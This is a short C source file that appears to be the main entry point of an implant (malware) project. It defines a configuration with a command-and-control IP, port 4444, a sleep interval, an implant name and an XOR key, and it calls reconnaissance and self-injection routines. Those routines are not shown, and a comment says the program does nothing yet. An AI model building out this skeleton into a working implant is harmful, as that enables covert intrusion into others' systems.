#include <stdio.h>
#include "config.h"
#include "recon.h"
#include "injection.h"

int main(VOID)

{
	//doesn't do anything yet
	IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA", 0x42 };
	printf("CONFIG: %s %d %d %s %X\n", config.c2ip, config.port, config.sleep_interval, config.implant_name, config.xor_key);

	collect_recon();

	inject_self(config);


	return 0;


}



